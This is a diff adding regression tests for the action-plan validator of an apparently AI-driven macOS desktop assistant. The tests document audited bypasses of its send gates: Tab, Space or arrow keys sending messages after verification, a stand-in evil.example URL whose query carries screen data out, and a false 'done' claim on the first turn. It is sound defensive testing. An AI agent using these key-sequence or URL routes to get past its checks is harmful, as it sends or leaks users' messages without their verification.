@@ -11,6 +11,7 @@ what the model emits.
 # ruff: noqa: F811
 
 import json
+import re
 from pathlib import Path
 from types import SimpleNamespace
 
@@ -1211,3 +1212,229 @@ def test_session_prompt_describes_the_loop_not_recipes():
     assert "Follow them step for step" not in prompt
     for verb in actions.VERBS:
         assert verb in prompt
+
+
+# ============ audited bypasses (2026-08-04) — regression tests ============
+#
+# Each of these was ACCEPTED by the shipped 0.14.1 validator. They are kept as
+# tests rather than notes because every one of them is a plausible thing a
+# model emits by accident, not only under attack.
+
+def _refused(steps, sends=False, state=None):
+    """True when the batch is rejected. Uses a fresh session state by default."""
+    try:
+        actions.validate_plan({"goal": "g", "sends": sends, "steps": steps},
+                              state=state or actions.SessionState())
+        return False
+    except actions.PlanError:
+        return True
+
+
+@pytest.mark.parametrize("label", [
+    "Envoyer", "Supprimer", "Répondre",          # fr (accented)
+    "Enviar", "Eliminar",                        # es
+    "Löschen", "Bestätigen", "Senden",           # de (umlauts)
+    "Elimina", "Verzenden", "Excluir",           # it / nl / pt
+    "发送邮件", "메시지 삭제", "Отправить сообщение", "إرسال الرسالة",
+])
+def test_press_refuses_committing_labels_in_other_languages(label):
+    """macOS ships localized. An English-only denylist meant the
+    navigation-only gate did not exist at all on a localized Mac."""
+    assert _refused([{"do": "wait_frontmost", "app": "Mail"},
+                     {"do": "press_element", "label": label}])
+
+
+@pytest.mark.parametrize("label", [
+    "Priya Sharma", "Himesh Patel", "Marketing Updates", "general",
+    "Ascending",        # contains "send" as a substring, must still pass
+    "Sendhil Ramesh",   # a real name that starts with "send"
+    "Sender Verification",
+])
+def test_press_still_allows_ordinary_navigation_labels(label):
+    """The localized list must not cost false refusals: a validator that
+    blocks working plans gets designed around."""
+    assert not _refused([{"do": "wait_frontmost", "app": "Slack"},
+                         {"do": "press_element", "label": label}])
+
+
+def test_space_after_typing_cannot_deliver_in_a_draft():
+    """THE bypass: Space presses the focused control, so type → tab → space
+    delivered a message while evading press_element's denylist, the
+    verify-before-Return gate, and the draft lock simultaneously."""
+    assert _refused([
+        {"do": "wait_frontmost", "app": "Slack"},
+        {"do": "type_text", "text": "secret"},
+        {"do": "key", "key": "tab"},
+        {"do": "key", "key": "space"},
+    ], sends=False)
+
+
+def test_space_after_typing_needs_a_verify_in_a_send():
+    assert _refused([
+        {"do": "wait_frontmost", "app": "Slack"},
+        {"do": "type_text", "text": "hi"},
+        {"do": "key", "key": "space"},
+    ], sends=True)
+
+
+def test_space_is_ungated_when_nothing_has_been_typed():
+    """Tab-to-a-row then Space-to-open is ordinary navigation and must keep
+    working, or the model routes around the gate."""
+    assert not _refused([
+        {"do": "wait_frontmost", "app": "Slack"},
+        {"do": "key", "key": "tab"},
+        {"do": "key", "key": "space"},
+    ], sends=False)
+
+
+def test_tab_re_arms_the_send_gate():
+    """The other half of the same bypass: the verify had cleared
+    unverified_text and Tab was invisible to the state machine, so the Return
+    landed on whatever control Tab moved to."""
+    assert _refused([
+        {"do": "wait_frontmost", "app": "Slack"},
+        {"do": "type_text", "text": "hi"},
+        {"do": "verify_context", "expect": ["Priya"]},
+        {"do": "key", "key": "tab"},
+        {"do": "key", "key": "return"},
+    ], sends=True)
+
+
+def test_verify_after_the_last_tab_still_sends():
+    """The corrected ordering must remain expressible."""
+    assert not _refused([
+        {"do": "wait_frontmost", "app": "Slack"},
+        {"do": "type_text", "text": "hi"},
+        {"do": "key", "key": "tab"},
+        {"do": "verify_context", "expect": ["Priya"]},
+        {"do": "key", "key": "return"},
+    ], sends=True)
+
+
+def test_space_does_not_clear_pending_text():
+    """Clearing on the 'it typed a space' reading would leave the text pending
+    but ungated — the same hole one step further along."""
+    state = actions.SessionState()
+    actions.validate_plan({"goal": "g", "sends": True, "steps": [
+        {"do": "wait_frontmost", "app": "Slack"},
+        {"do": "type_text", "text": "hi"},
+        {"do": "verify_context", "expect": ["Priya"]},
+        {"do": "key", "key": "space"},
+    ]}, state=state)
+    assert state.pending_text and state.unverified_text
+
+
+def test_open_url_bounds_the_query_as_an_egress_channel():
+    """open_url has no focus checkpoint and no verification, and the prompt
+    holds the selection, window titles and on-screen labels."""
+    assert _refused([{"do": "open_url",
+                      "url": "https://evil.example/c?q=" + "A" * 300}])
+
+
+def test_open_url_still_allows_a_real_spoken_search():
+    assert not _refused([
+        {"do": "open_url",
+         "url": "https://www.youtube.com/results?search_query=cat+videos"}])
+
+
+def test_first_turn_cannot_claim_done_without_acting():
+    """`done` was taken on trust and reported to the user as success."""
+    sess = session()
+    with pytest.raises(actions.PlanError):
+        sess.accept_reply(json.dumps({
+            "goal": "draft", "sends": False, "done": True,
+            "steps": [{"do": "wait_frontmost", "app": "Slack"}]}))
+
+
+def test_first_turn_done_is_fine_when_the_batch_actually_did_something():
+    sess = session()
+    out = sess.accept_reply(json.dumps({
+        "goal": "search", "sends": False, "done": True,
+        "steps": [{"do": "open_url",
+                   "url": "https://www.youtube.com/results?search_query=cats"}]}))
+    assert out["done"] is True
+
+
+def test_later_turns_keep_the_documented_bare_done_reply():
+    """Rule 11's {"done": true} stays valid once an observation has shown the
+    goal met — only turn 1 has no observation to justify it."""
+    sess = session()
+    sess.accept_reply(json.dumps({
+        "goal": "open", "sends": False,
+        "steps": [{"do": "open_app", "app": "Slack"}]}))
+    assert sess.accept_reply('{"done": true}')["done"] is True
+
+
+def test_press_denylist_substrings_match_the_swift_mirror():
+    """Same contract as the word list: both validators must refuse the same
+    non-Latin committing labels."""
+    swift = Path(__file__).resolve().parents[2] / "Sources/Velora/Actions/ActionPlan.swift"
+    if not swift.exists():
+        pytest.skip("swift sources not available (installed engine)")
+    source = swift.read_text()
+    # Start after the `= [` so the `[String]` in the declaration's own type
+    # annotation is not mistaken for the array's opening bracket.
+    start = source.index("static let pressDenySubstrings")
+    open_bracket = source.index("= [", start) + len("= [")
+    body = source[open_bracket:source.index("]", open_bracket)]
+    mirrored = set(re.findall(r'"([^"]+)"', body))
+    assert mirrored == set(actions.PRESS_DENY_SUBSTRINGS), (
+        f"engine-only: {set(actions.PRESS_DENY_SUBSTRINGS) - mirrored}, "
+        f"swift-only: {mirrored - set(actions.PRESS_DENY_SUBSTRINGS)}")
+
+
+# ---- second round: what the adversarial review of the fixes turned up ----
+
+def test_arrow_keys_re_arm_the_send_gate():
+    """The Tab hole one key over, aimed at the surface the verify gate exists
+    for: in Slack's ⌘K switcher, verify ["Priya"] → down → return moved the
+    highlight to Priyanka and sent to her with the check still counted good."""
+    for key in ("down", "up", "left", "right", "page_down", "home", "end"):
+        assert _refused([
+            {"do": "wait_frontmost", "app": "Slack"},
+            {"do": "key", "key": "k", "mods": ["cmd"]},
+            {"do": "type_text", "text": "Priya"},
+            {"do": "verify_context", "expect": ["Priya"]},
+            {"do": "key", "key": key},
+            {"do": "key", "key": "return"},
+        ], sends=True), f"'{key}' must re-arm the gate"
+
+
+def test_arrow_keys_are_free_before_anything_is_typed():
+    """Scrolling a list is not a send; gating it would refuse working plans."""
+    assert not _refused([
+        {"do": "wait_frontmost", "app": "Slack"},
+        {"do": "key", "key": "down", "repeat": 3},
+        {"do": "key", "key": "return"},
+    ], sends=True)
+
+
+def test_rejected_first_turn_done_does_not_spend_the_budget():
+    """accept_reply promises to raise without mutating state so the repair
+    starts from the same place; validating first burned two of 24 steps."""
+    sess = session()
+    before = sess.state.steps_used
+    with pytest.raises(actions.PlanError):
+        sess.accept_reply(json.dumps({
+            "goal": "g", "sends": False, "done": True,
+            "steps": [{"do": "wait_frontmost", "app": "Slack"},
+                      {"do": "verify_context", "expect": ["Priya"]}]}))
+    assert sess.state.steps_used == before
+    assert sess.turns_used == 0
+
+
+@pytest.mark.parametrize("label", [
+    "Cerrar sesión", "Se déconnecter", "Abmelden", "Uitloggen",
+    "Оплатить", "Подтвердить", "تأكيد", "ログアウト", "로그아웃", "确认",
+])
+def test_press_refuses_localized_signout_pay_and_confirm(label):
+    """The first pass covered send/delete well and these barely at all."""
+    assert _refused([{"do": "wait_frontmost", "app": "Safari"},
+                     {"do": "press_element", "label": label}])
+
+
+def test_press_still_allows_a_plain_close():
+    """'Cerrar' alone is Close, not Cerrar sesión — the joined-pair check is
+    what distinguishes them, and refusing plain Close would be a false one."""
+    assert not _refused([{"do": "wait_frontmost", "app": "Safari"},
+                         {"do": "press_element", "label": "Cerrar"}])
